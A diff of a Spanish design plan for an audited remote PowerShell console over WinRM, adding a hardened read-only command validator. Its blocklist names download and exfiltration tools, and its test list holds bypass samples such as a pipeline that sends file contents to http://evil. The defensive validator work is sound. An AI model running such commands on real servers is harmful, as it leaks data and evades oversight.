@@ -1,8 +1,38 @@
 # Plan 105 — Consola remota de prompts por servidor (auditada, reversible, 1-click switch)
 
-**Estado:** PROPUESTO
-**Versión:** v1
+**Estado:** CRITICADO (juez) — APROBADO-CON-CAMBIOS
+**Versión:** v2
 **Fecha:** 2026-07-08
+
+> ### Changelog v1 → v2 (crítica adversarial + arquitecto proactivo)
+> - **C1 (BLOQ, F3/F2):** `_launch_turn` (plan 90, `api/devops_agent.py:219-276`) NO acepta
+>   override de `context_blocks`: hornea `id="devops-chat"` / `title="Mensaje del operador
+>   (chat DevOps)"`. Era imposible obtener el `id="remote-console"` que prometía F3 sin
+>   tocar código del plan 90. Reconciliado: se REUSA `_launch_turn` **verbatim**; el
+>   contrato de consola viaja DENTRO de `message` (envuelto por `build_console_prompt`).
+>   Se eliminó la afirmación falsa `id="remote-console"`/`source` de F3.
+> - **C2 (BLOQ, F3):** firma de `build_console_prompt` contradictoria en el doc (definida sin
+>   `conversation_id`, llamada sin él en F2, pero el template interpola `{{CONVERSATION_ID}}`).
+>   Firma unificada: `build_console_prompt(server_alias, base_url, message, conversation_id,
+>   *, write_enabled)`; todos los call sites de F2 la pasan.
+> - **C3 (IMPORTANTE, F1 seguridad):** el validador read-only tenía bypass real vía bloques
+>   `{ }` no inspeccionados (`... | %{ & $_ }`, `... | ForEach-Object { Invoke-WebRequest }`).
+>   Endurecido: blocklist de `&`/`.Invoke`/`$(`/backtick/`[scriptblock]`/`iwr`/`irm`/
+>   `Invoke-WebRequest`/`Invoke-RestMethod`/`Start-Process`/`Add-Type`, y RECHAZO de todo
+>   comando con `{`…`}` en modo read_only. + tests nuevos.
+> - **C4 (IMPORTANTE, F4 UX — directiva del operador):** `window.confirm` (diálogo nativo
+>   feo) reemplazado por confirmación in-panel profesional; ver `[ADICIÓN ARQUITECTO]` UX.
+> - **C5 (MENOR, F1/F2):** faltaban tests para `check_winrm` y para exec manual sin
+>   `conversation_id` (debe ser read_only). Agregados.
+> - **[ADICIÓN ARQUITECTO] (F4):** paquete de UX de consola profesional y novedosa
+>   (badge de modo persistente, auditoría tejida en el stream como command-cards, header de
+>   servidor activo con chip WinRM, chips de diagnóstico 1-click, atajos de teclado). Todo
+>   opt-in/sin config nueva, HITL respetado.
+>
+> **Veredicto del juez:** APROBADO-CON-CAMBIOS. Sin bloqueantes remanentes tras C1-C2; base
+> sólida (reuso real de 90/91, flag OFF byte-idéntico, auditoría estructural). Los C1/C2 eran
+> bloqueantes de *implementabilidad por modelo menor* (contradicciones internas) y quedan
+> resueltos en este v2.
 **Serie DevOps:** extensión del panel (plan 87 §3.12); consume el registro de servidores del plan 91 y el patrón de conversaciones del plan 90.
 **Dependencias duras:** plan 91 (IMPLEMENTADO — `services/server_registry.py`, `api/devops_servers.py`), plan 90 (IMPLEMENTADO — `api/devops_agent.py`, `_launch_turn`), plan 87 (shell `DevOpsPage.tsx` + `FlagGateBanner`).
 **Relación con plan 101:** complementario, NO solapado. El 101 (PROPUESTO) bootstrapea carpetas vía UNC + `net use`. Este plan ejecuta PROMPTS de agente y comandos PowerShell vía WinRM con auditoría. Ninguno depende del otro.
@@ -264,13 +294,18 @@ _READ_VERBS = re.compile(
     r"|^\s*(dir|ls|type|cat|gci|gc|echo|hostname|whoami|tasklist)\b",
     re.IGNORECASE,
 )
-# Blocklist de tokens mutantes/peligrosos en CUALQUIER parte del comando:
+# Blocklist de tokens mutantes/peligrosos en CUALQUIER parte del comando.
+# C3 (v2): sumados vectores de EJECUCIÓN ARBITRARIA y descarga/exfil que un agente
+# podría intentar creyéndolos "de lectura" (el riesgo real es el AGENTE, no un humano
+# adversario — mono-operador). El operador de veras destructivo usa el modo escritura.
 _MUTANT_TOKENS = re.compile(
     r"(Remove-|Set-|New-|Stop-|Start-|Restart-|Clear-|Move-|Rename-|Copy-|Add-|Install-|"
-    r"Uninstall-|Disable-|Enable-|Invoke-Expression|iex\b|Out-File|Set-Content|"
+    r"Uninstall-|Disable-|Enable-|Invoke-Expression|iex\b|Invoke-Command|Invoke-WebRequest|"
+    r"Invoke-RestMethod|\biwr\b|\birm\b|\bcurl\b|\bwget\b|Start-Process|Add-Type|"
+    r"\.Invoke\b|\[scriptblock\]|Out-File|Set-Content|"
     r"Add-Content|Format-Volume|Stop-Computer|Restart-Computer|del\b|rd\b|rmdir\b|"
     r"erase\b|mklink\b|reg\s+(add|delete)|schtasks|sc\s+(config|delete|stop|start)|"
-    r">>|(?<![0-9a-zA-Z])>(?![0-9a-zA-Z=]))",
+    r"&|\$\(|`|>>|(?<![0-9a-zA-Z])>(?![0-9a-zA-Z=]))",
     re.IGNORECASE,
 )
 
@@ -279,6 +314,11 @@ def is_read_only_command(command: str) -> bool:
     mutantes. Cada segmento de pipeline (split por '|') y cada statement (split por
     ';') debe cumplir la allowlist o ser un cmdlet de formato/filtro inocuo."""
     if not command or not command.strip():
+        return False
+    # C3 (v2): en read_only NUNCA se permiten bloques de script { ... }: son el vector
+    # clásico de ejecución arbitraria dentro de un pipeline "de lectura"
+    # (p.ej. `Get-Content x | %{ & $_ }`). Ante llaves → RECHAZA.
+    if "{" in command or "}" in command:
         return False
     if _MUTANT_TOKENS.search(command):
         return False
@@ -417,6 +457,13 @@ monkeypatch):
 - `test_f1_read_only_rejects_mutants` — cada uno → False: `Remove-Item x`,
   `Get-Item x; Remove-Item x`, `Get-Content x | Out-File y`, `Get-Process > p.txt`,
   `Invoke-Expression $c`, `iex $c`, `Restart-Computer`, `schtasks /delete /tn x`, `""`.
+- `test_f1_read_only_rejects_scriptblock_vectors` (C3 v2) — cada uno → False:
+  `Get-Content x | %{ & $_ }`, `Get-ChildItem | ForEach-Object { $_.Delete() }`,
+  `Get-Content x | %{ Invoke-WebRequest http://evil/$_ }`, `Get-Item x | %{ iex $_ }`,
+  `Get-Process | Where-Object { Stop-Process $_ }`, `& (Get-Command Remove-Item)`,
+  `Get-Content x | iwr`, `Get-Foo; Start-Process calc`, `Get-Content x | Add-Type -Path $_`.
+  (Cubre: rechazo de llaves `{`/`}` + blocklist enriquecida `&`/`.Invoke`/`iwr`/`irm`/
+  `Invoke-WebRequest`/`Start-Process`/`Add-Type`/`$(`/backtick.)
 - `test_f1_read_only_rejects_unknown_first_verb` — `Invoke-WebRequest http://x` → False.
 - `test_f1_run_remote_read_only_blocks_and_audits` — mode read_only + comando mutante ⇒
   `ok=False, error="command_not_read_only"`, subprocess NO llamado, y el JSONL del alias
@@ -434,13 +481,15 @@ monkeypatch):
   mensaje fijo sin repr del argv (patrón C1 plan 91).
 - `test_f1_audit_read_most_recent_first` — 3 appends ⇒ `read_audit` los devuelve invertidos;
   línea corrupta intercalada se salta.
+- `test_f1_check_winrm_non_windows` (C5 v2) — monkeypatch `sys.platform`→"linux" ⇒
+  `check_winrm(alias)` devuelve `{"ok": False, "detail": "windows_only"}` sin subprocess.
 - `test_f1_no_remote_exec_bypass` (KPI-2, centinela) — grep del árbol backend:
   `Invoke-Command -ComputerName` aparece SOLO en `services/remote_exec_invoke.ps1`, y
   `subprocess` NO se usa en `api/devops_remote_console.py` (leer el fuente con
   `Path(...).read_text()` y assert).
 
 **Comando:** `cd "Stacky Agents/backend" && venv/Scripts/python.exe -m pytest tests/test_plan105_remote_exec_service.py -q`
-**Criterio binario:** 12 tests en verde. **Flag:** consumida vía guard (1).
+**Criterio binario:** 14 tests en verde. **Flag:** consumida vía guard (1).
 **Runtimes:** N/A (servicio backend). **Trabajo del operador:** ninguno.
 
 ---
@@ -504,16 +553,24 @@ def _conv_meta(ticket) -> dict:
      "server_alias":server_alias, "write_enabled":False}))`.
    - **OBLIGATORIO** sellar `ticket.external_id = -ticket.id` tras `session.flush()`
      (gotcha backfill `db.py:158-196`, documentado en `api/devops_agent.py:60-77`).
-   - Lanza el turno reusando `from api.devops_agent import _launch_turn` con
-     `conversation_id`, `runtime` validado contra `_CLI_RUNTIMES` (import de
-     `api.devops_agent`), y `message` YA ENVUELTO por el builder de F3
-     (`build_console_prompt(server_alias, base_url, message, write_enabled=False)`),
-     donde `base_url = request.host_url.rstrip("/")`.
+   - Lanza el turno reusando `from api.devops_agent import _launch_turn` **VERBATIM**
+     (NO se modifica el plan 90). C1 (v2): `_launch_turn` hornea su propio
+     `context_blocks` con `id="devops-chat"` (`api/devops_agent.py:231-237`) y NO acepta
+     override — por eso el contrato de consola NO viaja en un block aparte sino DENTRO de
+     `message`: se pasa `message = build_console_prompt(server_alias, base_url, message,
+     conversation_id, write_enabled=<estado de la conversación>)`, con
+     `base_url = request.host_url.rstrip("/")`. `runtime` validado contra `_CLI_RUNTIMES`
+     (import de `api.devops_agent`). Consecuencia sancionada: las ejecuciones de consola
+     comparten `agent_type="devops"` con el chat del plan 90, PERO su ticket es
+     `ado_id=-4` (no `-2`), así que el listado del plan 90 (que filtra `ado_id==-2`) NUNCA
+     las mezcla, y viceversa (la ruta 7 filtra `ado_id==-4`). Verificado sin tocar 90.
    - Respuesta 202 `{ok, conversation_id, execution_id, runtime, server_alias}`.
 5. `POST /conversations/<int:cid>/message` — mismo contrato dual del plan 90 (stdin vivo
    si el último run está `running`, si no `_launch_turn` nuevo — copiar la lógica de
    `api/devops_agent.py:103-166` filtrando por `ado_id=-4`). El mensaje también se envuelve
-   con `build_console_prompt` SOLO cuando abre turno nuevo (en stdin vivo va crudo).
+   con `build_console_prompt(server_alias, base_url, message, cid, write_enabled=<estado>)`
+   SOLO cuando abre turno nuevo (en stdin vivo va crudo). `server_alias` y `write_enabled`
+   se leen de `_conv_meta(ticket)`; `cid` es el id de la conversación.
 6. `POST /conversations/<int:cid>/write-mode` — body `{"enabled": true|false}` (HITL §3.2):
    actualiza `write_enabled` en el JSON de `description` y **audita**
    `append_audit(alias, {kind:"write_mode", enabled, conversation_id, user})`. 404 si la
@@ -538,6 +595,9 @@ exacto de `devops_servers_bp`.
 - `test_f2_exec_409_servers_disabled` — flag consola ON + servers OFF ⇒ 409.
 - `test_f2_exec_non_json_400` — POST form-encoded ⇒ 400 (patrón C5 plan 91).
 - `test_f2_exec_read_only_403` — `run_remote` mock devuelve `command_not_read_only` ⇒ 403.
+- `test_f2_exec_manual_no_conversation_is_read_only` (C5 v2) — POST `/exec` con `alias` y
+  `command` pero SIN `conversation_id` ⇒ `run_remote` recibe `mode="read_only"` (el camino
+  manual sin agente jamás escala a escritura por sí solo).
 - `test_f2_exec_write_requires_conversation_flag` — conversación con `write_enabled=False`
   ⇒ `run_remote` recibe `mode="read_only"`; tras POST `/write-mode {"enabled":true}` ⇒
   recibe `mode="write"`.
@@ -554,7 +614,7 @@ exacto de `devops_servers_bp`.
 - `test_f2_audit_endpoint_paginates` — limit/offset respetados; alias inválido 400.
 
 **Comando:** `cd "Stacky Agents/backend" && venv/Scripts/python.exe -m pytest tests/test_plan105_remote_console_api.py -q`
-**Criterio binario:** 12 tests en verde.
+**Criterio binario:** 13 tests en verde.
 **Flag:** `STACKY_DEVOPS_REMOTE_CONSOLE_ENABLED` (gate duro 404).
 **Runtimes:** conversaciones = CLI runtimes (restricción heredada del plan 90, §3.6);
 `/exec`, `/audit`, `/winrm` son runtime-agnósticos. **Trabajo del operador:** ninguno.
@@ -571,8 +631,12 @@ los términos del riel §3.1, con texto idéntico para ambos runtimes CLI.
 
 ```python
 def build_console_prompt(server_alias: str, base_url: str, message: str,
-                         *, write_enabled: bool) -> str:
-    """Envuelve el mensaje del operador con el contrato de la consola remota."""
+                         conversation_id: int, *, write_enabled: bool) -> str:
+    """Envuelve el mensaje del operador con el contrato de la consola remota.
+
+    C2 (v2): `conversation_id` es POSICIONAL y OBLIGATORIO (el template lo interpola en
+    el JSON del curl). Todos los call sites de F2 (rutas 4 y 5) lo pasan.
+    """
 ```
 
 Contenido EXACTO del envoltorio (f-string; `{...}` interpolados):
@@ -604,14 +668,16 @@ PEDIDO DEL OPERADOR:
 ```
 
 Notas de implementación:
-- `{{CONVERSATION_ID}}` se reemplaza por el id real: `build_console_prompt` recibe además
-  `conversation_id: int` (agregarlo a la firma; F2 lo pasa). El pseudocódigo de arriba es la
-  plantilla; la función interpola TODO (sin placeholders residuales — test lo verifica).
+- `{{CONVERSATION_ID}}` se reemplaza por `conversation_id` (parámetro posicional de la
+  firma, C2 v2). El pseudocódigo de arriba es la plantilla; la función interpola TODO (sin
+  placeholders residuales — test lo verifica).
 - `^` es el continuador de línea de cmd; en los runtimes CLI de Windows el agente puede
   igualmente emitir la llamada en una línea. El texto lo aclara implícitamente al ser un
   ejemplo.
-- F2 (rutas 4 y 5) usa esta función; el `context_blocks` conserva el shape del plan 90
-  (`api/devops_agent.py:230-236`) con `id="remote-console"`, `source.type="devops_panel"`.
+- C1 (v2): NO hay `context_blocks` propio. F2 pasa el string devuelto por
+  `build_console_prompt` como el `message` de `_launch_turn`, que a su vez lo envuelve en
+  su block `id="devops-chat"` (plan 90, sin modificar). El contrato de consola vive en el
+  contenido de ese block. No se toca `api/devops_agent.py`.
 
 **Tests PRIMERO** — `Stacky Agents/backend/tests/test_plan105_console_prompt.py`:
 - `test_f3_prompt_contains_alias_url_and_message`.
@@ -644,11 +710,13 @@ auditoría; cambiar de servidor re-filtra todo.
      COPIAR la firma real de ese archivo, no inventarla).
    - Layout en 3 zonas (usar clases existentes de `devops.module.css`; si falta alguna,
      agregarla AL FINAL del archivo sin tocar reglas existentes):
-     a. **Barra superior:** servidor activo (del selector del shell, plan 91 F6) + semáforo
-        WinRM (`GET /api/devops/console/winrm/<alias>` al montar y al cambiar alias:
-        verde ok / rojo con `detail` en tooltip) + toggle "Permitir escritura (esta
-        conversación)" con `window.confirm("Vas a permitir comandos que MODIFICAN el
-        servidor <alias>. ¿Confirmás?")` antes del POST `/write-mode`.
+     a. **Barra superior (header de servidor activo):** ver `[ADICIÓN ARQUITECTO]` — NO es
+        un `window.confirm` nativo. Es un header-card con: alias + host + chip-semáforo
+        WinRM (`GET /api/devops/console/winrm/<alias>` al montar y al cambiar alias: verde
+        ok / rojo con `detail` en tooltip + botón "Reintentar") + **badge de modo
+        persistente** (READ-ONLY verde / ESCRITURA ámbar) + toggle "Permitir escritura
+        (esta conversación)" con **confirmación in-panel** (paso de doble-click estilizado,
+        C4 v2), nunca diálogo nativo del navegador.
      b. **Columna izquierda:** lista de conversaciones del servidor activo
         (`GET /api/devops/console/conversations?server=<alias>`) + botón "Nueva
         conversación". Click en una conversación la abre (readonly: título, estado del
@@ -690,18 +758,73 @@ auditoría; cambiar de servidor re-filtra todo.
    `consoleStartConversation`, `consoleSendMessage`, `consoleListConversations`,
    `consoleSetWriteMode` — shapes 1:1 con F2.
 
+---
+
+**[ADICIÓN ARQUITECTO] — Paquete de UX "consola profesional" (directiva del operador:
+muy cómoda, eficiente, novedosa y profesional).**
+
+Todo lo siguiente es puramente frontend, opt-in por naturaleza (solo se ve con la flag ON),
+CERO config nueva, HITL intacto (el operador sigue disparando cada turno y cada exec), y
+reusa `devops.module.css` (reglas nuevas SOLO al final del archivo, sin tocar existentes).
+Coherencia visual: mismos tokens/clases que `ServersSection.tsx` y `DevOpsAgentSection.tsx`.
+
+- **UX-1 — Header de servidor activo (reemplaza la barra pobre).** Card fija arriba con:
+  `alias` en grande, `host` en gris, chip-semáforo WinRM (verde "WinRM OK" / rojo con
+  `detail` + botón "Reintentar" que re-hace `GET /winrm/<alias>`), y el **badge de modo**
+  (abajo). Da contexto instantáneo al cambiar de servidor (refuerza KPI-1/KPI-4 sin tocar
+  el selector del shell). Estado vacío claro si no hay servidor seleccionado.
+
+- **UX-2 — Badge de modo PERSISTENTE + confirmación in-panel (C4, mata el `window.confirm`).**
+  Un badge SIEMPRE visible pegado al input: `READ-ONLY` (verde) o `ESCRITURA` (ámbar,
+  con ícono de aviso). El toggle a escritura NO usa diálogo nativo: al primer click el
+  botón se transforma in-place en "⚠ Confirmá: habilitar ESCRITURA en «<alias>»" (dos
+  botones: "Sí, habilitar" / "Cancelar"); recién el segundo click hace
+  `POST /write-mode {enabled:true}`. Al volver a lectura, un solo click. El badge ámbar
+  persiste mientras dure la conversación en escritura → el operador NUNCA olvida en qué
+  modo está (mitiga R2 de raíz). Profesional y sin popups del navegador.
+
+- **UX-3 — Auditoría TEJIDA en el stream como "command-cards" (el toque novedoso).** Además
+  de la tab "Auditoría" (que se mantiene como vista completa/paginada), cada comando que el
+  agente ejecuta aparece EN LÍNEA dentro de la conversación como una card colapsable:
+  encabezado `▸ <comando>` + chip `ok/error` + `exit_code` + `duración` + botón "copiar
+  comando"; expandida muestra stdout/stderr (truncado). Fuente de datos: la sección
+  poll-ea `GET /audit/<alias>?limit=N` y correlaciona por `conversation_id`. Así "auditable"
+  deja de ser un lugar aparte que hay que recordar mirar: la trazabilidad está donde ocurre
+  la acción. Reusa el patrón visual de `CodexConsoleDock`/mensajes del chat DevOps.
+
+- **UX-4 — Chips de diagnóstico 1-click (eficiencia real, HITL intacto).** Fila de chips
+  sobre el textarea con los diagnósticos más pedidos, que SOLO PRE-RELLENAN el prompt (no
+  envían solos — el operador revisa y presiona Enviar): "Ver últimos logs", "Espacio en
+  disco", "Procesos activos", "Servicios detenidos", "Últimos errores del Visor de eventos".
+  Son texto en castellano que el agente traduce a PowerShell de lectura. Reduce tipeo del
+  90% de los usos sin quitar el control humano. (Los chips son estáticos en el front; NO son
+  config del operador.)
+
+- **UX-5 — Atajos de teclado y foco.** `Enter` envía, `Shift+Enter` = nueva línea,
+  `Ctrl/Cmd+Enter` fuerza envío; al abrir/crear conversación el foco cae en el textarea; al
+  cambiar de servidor se limpia el borrador. Sin dependencias nuevas.
+
+Ninguna de estas piezas agrega endpoints ni flags: todas consumen las 7 rutas de F2. Si
+alguna clase CSS falta en `devops.module.css`, se agrega AL FINAL (badge-modo, chip-winrm,
+command-card) sin alterar reglas previas.
+
 **Tests PRIMERO** — `Stacky Agents/frontend/src/pages/__tests__/RemoteConsoleSection.test.ts`
 (convención del repo: `ServersSection.test.ts` vive ahí; vitest con fetch mockeado):
 - `test se renderiza vacío sin servidor seleccionado` (hint visible).
 - `test cambia de alias ⇒ re-fetch de conversations y audit con el alias nuevo` (KPI-4).
-- `test toggle escritura pide confirm y hace POST /write-mode` (mock `window.confirm`).
+- `test toggle escritura usa confirmación in-panel (NO window.confirm) y hace POST /write-mode`
+  (C4 v2): el spy sobre `window.confirm` NUNCA se llama; el primer click muestra el paso de
+  confirmación, el segundo dispara el POST. Verifica que el badge de modo pasa a "ESCRITURA".
 - `test comando manual llama POST /exec con alias activo y muestra stdout`.
-- `test auditoría renderiza filas del mock`.
+- `test auditoría renderiza filas del mock` (tab completa).
+- `test chip de diagnóstico solo pre-rellena el prompt y NO envía` (UX-4, HITL): click en
+  un chip setea el textarea; ningún POST se dispara hasta "Enviar".
+- `test command-card in-line muestra comando+exit_code+duración desde el audit mock` (UX-3).
 
 **Comandos:**
 `cd "Stacky Agents/frontend" && npx vitest run src/pages/__tests__/RemoteConsoleSection.test.ts`
 `cd "Stacky Agents/frontend" && npx tsc --noEmit`
-**Criterio binario:** 5 tests vitest en verde + `tsc` 0 errores.
+**Criterio binario:** 7 tests vitest en verde + `tsc` 0 errores.
 **Flag:** gate declarativo vía `healthKey`.
 **Runtimes:** UI runtime-agnóstica; conversación restringida a CLI (aviso Copilot reusado);
 comando manual funciona siempre. **Trabajo del operador:** opt-in (activar flag desde el
@@ -749,10 +872,16 @@ propio banner; default off).
   la UI + error verbatim con hint (`Enable-PSRemoting` lo corre el OPERADOR en el server,
   §3.8). Sin WinRM la consola no ejecuta: degradación honesta, no silenciosa.
 - **R2 — El validador read-only tiene falsos negativos/positivos.** Diseño conservador
-  (rechaza ante la duda). Falso positivo (bloquea lectura legítima): el operador puede usar
-  modo escritura para esa conversación (auditado). Falso negativo: la blocklist cubre los
-  vectores conocidos (redirect, `iex`, verbos mutantes); el modo escritura existe
-  justamente para no incentivar bypasses creativos.
+  (rechaza ante la duda). C3 (v2): además de redirect/`iex`/verbos mutantes, la blocklist
+  ahora cubre call-operator `&`, `.Invoke`, `$(`, backtick, `[scriptblock]`, descarga/exfil
+  (`Invoke-WebRequest`/`Invoke-RestMethod`/`iwr`/`irm`/`curl`/`wget`), `Start-Process`,
+  `Add-Type`, y RECHAZA todo comando con llaves `{ }` (vector de método .NET arbitrario tipo
+  `$_.Delete()` que ningún blocklist de cmdlets puede enumerar). Falso positivo esperado:
+  filtros `Where-Object { }` / `ForEach-Object { }` quedan bloqueados en lectura → el
+  operador habilita escritura (auditada) o el agente filtra con `-Filter`/`Select-String`/
+  `Select-Object`. La garantía dura NO es el validador (regex sobre PowerShell es leaky por
+  naturaleza) sino: auditoría 100% + escritura opt-in por conversación + el agente sin
+  credencial (§3.1). El threat actor es el AGENTE, no un humano adversario (mono-operador).
 - **R3 — El agente intenta rodear el endpoint (SSH/psexec propios).** El prompt lo prohíbe
   (F3) y el agente no tiene la credencial (§3.1): sin password no hay canal alternativo.
 - **R4 — Password en memoria del proceso hijo.** Aceptado (igual que RDP/cmdkey del plan
@@ -800,8 +929,9 @@ propio banner; default off).
 
 ## 11. Definición de Hecho (DoD)
 
-- [ ] 4 archivos de test backend nuevos verdes (≈33 tests) corridos POR ARCHIVO con el venv.
-- [ ] 5 tests vitest nuevos verdes + `npx tsc --noEmit` sin errores.
+- [ ] 4 archivos de test backend nuevos verdes (≈36 tests: F0=4, F1=14, F2=13, F3=5)
+      corridos POR ARCHIVO con el venv.
+- [ ] 7 tests vitest nuevos verdes + `npx tsc --noEmit` sin errores.
 - [ ] No-regresión dirigida verde (F5.4).
 - [ ] Flag OFF ⇒ 404 en las 7 rutas y sección gateada (KPI-3 verificado por test).
 - [ ] Grep manual: el password de prueba no aparece en ningún artefacto (audit JSONL,
